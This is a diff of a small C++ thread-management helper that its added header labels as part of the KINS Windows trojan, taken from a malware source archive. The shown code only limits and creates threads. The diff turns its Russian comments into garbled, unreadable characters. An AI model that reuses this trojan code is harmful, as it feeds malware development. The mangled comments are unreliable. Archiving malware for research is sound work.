@@ -1,3 +1,14 @@
+/*
+  name      KINS
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 
 #include "threadsgroup.h"
@@ -46,14 +57,14 @@ DWORD ThreadsGroup::_numberOfActiveThreads(GROUP *group)
 
 bool ThreadsGroup::_createThread(GROUP *group, SIZE_T stackSize, LPTHREAD_START_ROUTINE startAddress, LPVOID parameter, LPDWORD threadId, HANDLE *threadHandle)
 {
-  //Проверяем лимит.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
   if(group->count >= MAXIMUM_WAIT_OBJECTS)
   {
-    CWA(kernel32, SetLastError)(ERROR_TOO_MANY_TCBS); //хз че еще выставить.
+    CWA(kernel32, SetLastError)(ERROR_TOO_MANY_TCBS); //пїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
     return false;
   }
 
-  //Создаем нить.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
   if(startAddress)
   {
     HANDLE handle = CWA(kernel32, CreateThread)(NULL, stackSize, startAddress, parameter, 0, threadId);
